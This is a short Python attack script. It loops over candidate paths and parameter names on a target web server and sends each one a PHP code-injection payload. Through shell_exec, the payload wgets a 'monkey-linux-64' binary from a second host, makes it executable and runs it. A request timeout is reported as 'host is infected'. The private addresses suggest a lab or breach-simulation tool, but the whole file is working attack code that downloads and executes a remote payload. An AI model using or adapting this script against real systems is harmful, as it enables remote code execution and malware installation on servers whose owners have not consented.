from bs4 import BeautifulSoup    
import urllib.parse
import requests
import eventlet
#eventlet.monkey_patch()
import time

base_url = 'http://10.10.10.57/'
file = open("file", "r")
params = open("params", "r")
#payload = '=$output=shell_exec("wget --no-check-certificate https://10.10.10.50:5000/api/monkey/download/monkey-linux-64; chmod 777 monkey-linux-64; ./monkey-linux-64 m0nk3y -s 10.10.10.50:5000");echo "<pre>$output</pre>";'
for i in file:
	r = requests.get(base_url + i.rstrip('\n'))
	if r.status_code == 200:
		params.seek(0)
		for j in params:
			try:
				with eventlet.Timeout(15):
					# print(base_url + i.rstrip('\n') + '?' + j.rstrip('\n') + '=$output=shell_exec("wget --no-check-certificate https://10.10.10.50:5000/api/monkey/download/monkey-linux-64; chmod 777 monkey-linux-64; ./monkey-linux-64 m0nk3y -s 10.10.10.50:5000");echo "<pre>$output</pre>";')
					launch = requests.get(base_url + i.rstrip('\n') + '?' + j.rstrip('\n') + '=$output=shell_exec("wget --no-check-certificate https://10.10.10.50:5000/api/monkey/download/monkey-linux-64; chmod 777 monkey-linux-64; ./monkey-linux-64 m0nk3y -s 10.10.10.50:5000");echo "<pre>$output</pre>";', verify=False)
			except eventlet.timeout.Timeout:
				print("host is infected")								
				params.close()
				file.close()

